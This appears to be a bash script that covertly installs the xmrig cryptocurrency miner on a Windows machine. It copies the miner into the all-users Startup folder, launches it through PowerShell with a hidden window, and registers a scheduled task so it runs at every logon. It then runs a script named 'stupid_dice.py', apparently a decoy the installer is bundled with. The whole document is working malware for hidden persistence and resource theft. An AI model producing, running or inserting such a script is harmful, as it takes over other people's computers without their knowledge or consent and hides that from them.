#!/bin/bash

# Define paths
XMIRG_FOLDER="xmrig-6.22.2"
STARTUP_FOLDER="/c/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
XMIRG_EXE="$STARTUP_FOLDER/$XMIRG_FOLDER/xmrig.exe"
BAT_FILE="$STARTUP_FOLDER/xmrig_start.bat"

# Step 1: Move the xmrig folder to the Startup folder
mv "$XMIRG_FOLDER" "$STARTUP_FOLDER"

# Step 2: Create a batch file to run xmrig.exe invisibly (no window)
echo "start /B \"$XMIRG_EXE\"" > "$BAT_FILE"

# Step 3: Use PowerShell to run xmrig.exe invisibly (hidden window)
powershell -WindowStyle Hidden -Command "Start-Process 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/xmrig-6.22.2/xmrig.exe' -Priority 'BelowNormal'"

# Step 4: Set up Task Scheduler to run xmrig.exe at login without visible window
schtasks /create /tn "xmrig_task" /tr "\"$BAT_FILE\"" /sc onlogon /f

./stupid_dice.py